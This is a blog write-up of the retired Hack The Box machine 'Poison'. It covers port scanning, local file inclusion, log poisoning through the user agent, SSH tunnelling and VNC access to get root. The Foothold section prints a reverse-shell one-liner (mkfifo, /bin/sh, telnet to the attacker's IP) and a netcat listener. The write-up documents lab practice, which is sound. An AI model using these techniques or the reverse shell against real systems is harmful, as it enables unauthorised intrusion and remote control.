---
layout: post
title: Hack the Box - Poison
date: 2020-09-08 20:26:22 +0100
description: Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.
img: poison.png
fig-caption: Poison
categories: HackTheBox
tags: [Medium, FreeBSD, Retired, CTF]
---
## Overview
Poison is a fairly easy machine which focuses mainly on log poisoning and port forwarding/tunneling. The machine is running FreeBSD which presents a few challenges for novice users as many common binaries from other distros are not available.

## Enumeration
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
└─$ sudo nmap -p- -T4 10.129.117.245   
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-22 20:34 GMT
Stats: 0:05:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 78.95% done; ETC: 20:41 (0:01:22 remaining)
Nmap scan report for 10.129.117.245
Host is up (0.016s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 388.67 seconds
```
When interacting with the site I noticed that when you choose a script it includes it as a query parameter which hints at LFI. To test this I tried to include `/etc/hosts` and was happy to see it was successful.

## Foothold
As there didn't seem to be a way to upload files, adding an entry into the log files seemed like a logical approach. I tested including the log files and managed to using the filepath `/var/log/httpd-access.log`. Then using burpsuite I added a webshell through the user agent. With this in place I was able to achieve RCE and sent back a reverse shell using the following command.
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i |telnet 10.10.14.27 8082 > /tmp/f
```
With a netcat listener running it sent back the shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
└─$ nc -nlvp 8082
listening on [any] 8082 ...
connect to [10.10.14.27] from (UNKNOWN) [10.129.117.252] 37331
whoami
www
```
In this directory I found a password backup file that had been repeatedly base64 encoded. So after a few iterations of decoding it, which we can use to SSH in as a user.

## Privilege Escalation
During enumeration on the target I found a file called `secret.zip`. This can be extracted using the users password. I also found a port open that was bound to localhost. So we can set up port forwarding using SSH with the following command.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
└─$ ssh -L 5901:127.0.0.1:5901 charix@10.129.117.252
Password for charix@Poison:
Last login: Mon Mar 22 23:14:57 2021 from 10.10.14.27
FreeBSD 11.1-RELEASE (GENERIC) #0 r321309: Fri Jul 21 02:08:28 UTC 2017

Welcome to FreeBSD!
```
Googling the port I found it was a vnc port so while attempting to use the extracted secret file and connect on that port we then get a root shell.
```
┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox/poison]
└─$ vncviewer 127.0.0.1::5901 -passwd secret/secret
Connected to RFB server, using protocol version 3.8
Enabling TightVNC protocol extensions
Performing standard VNC authentication
Authentication successful
Desktop name "root's X desktop (Poison:1)"
```